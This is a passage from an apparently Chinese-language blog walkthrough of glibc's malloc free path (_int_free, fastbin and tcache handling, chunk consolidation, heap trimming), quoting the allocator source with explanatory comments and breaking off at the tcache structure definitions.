do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//唯一的tcache</span><br>    <br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="变量定义-1"><a href="#变量定义-1" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></div></td></tr></table></figure><h3 id="小检查-amp-tcache"><a href="#小检查-amp-tcache" class="headerlink" title="小检查 &amp; tcache"></a>小检查 &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></div></td></tr></table></figure><h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">        and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">        bordering top into fastbins </span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//这个宏是在if语句里加上一条,意义是p不和top chunk相邻</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    )<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || <br>            __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">        of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">        after getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock || (<br>                                &#123;<br>                                    assert(locked == <span class="hljs-number">0</span>);<br>                                    __libc_lock_lock(av-&gt;mutex);<br>                                    locked = <span class="hljs-number">1</span>;<br>                                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ || <br>                                    chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;<br>                                &#125;))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!have_lock)<br>            &#123;<br>                __libc_lock_unlock(av-&gt;mutex);<br>                locked = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 将chunk的mem部分全部设置为perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// 设置fast chunk的标记位</span><br>        set_fastchunks(av);<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>        fb = &amp;fastbin(av, idx); <span class="hljs-comment">//取出fastbin头指针</span><br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        <span class="hljs-comment">//多线程相关, 跳过</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>; <span class="hljs-comment">//不就是 1 吗?</span><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">        (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            &#123; <span class="hljs-comment">//防止对 fast bin double free</span><br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">        size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">        only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>))<br>        &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong> </p><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ol><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ol><p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong> </p><p>在没有锁的情况下，先获得锁。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></div></td></tr></table></figure><h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// 当前free的chunk不能是top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前要free的chunk的使用标记没有被标记，double free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 下一个chunk的大小</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span><br><span class="hljs-comment">// nextsize是否大于系统可提供的内存</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">//将指针的mem部分全部设置为perturb_byte        </span><br>free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></div></td></tr></table></figure><h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* consolidate backward */</span>        <br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            <br>    prevsize = prev_size(p);            <br>    size += prevsize;            <br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            <br>    unlink(av, p, bck, fwd);        <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="下一块不是-top-chunk-合并高地址-chunk放入unsorted"><a href="#下一块不是-top-chunk-合并高地址-chunk放入unsorted" class="headerlink" title="下一块不是 top chunk - 合并高地址 chunk放入unsorted"></a>下一块不是 top chunk - 合并高地址 chunk放入unsorted</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并，并将合并后的 chunk 放入到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 如果下一个chunk不是top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// 获取下一个 chunk 的使用状态</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 把 chunk 放在 unsorted chunk 链表的头部</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// 简单的检查</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    <span class="hljs-comment">//只用于DE<span class="hljs-doctag">BUG:</span></span><br>    check_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// 一般合并到 top chunk 都会执行这部分代码。</span><br>         <span class="hljs-comment">// 那就向系统返还内存</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果有 fast chunk 就进行合并</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// 主分配区</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk 大于当前的收缩阙值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// 非主分配区，则直接收缩heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="两个struct"><a href="#两个struct" class="headerlink" title="两个struct"></a>两个struct</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span 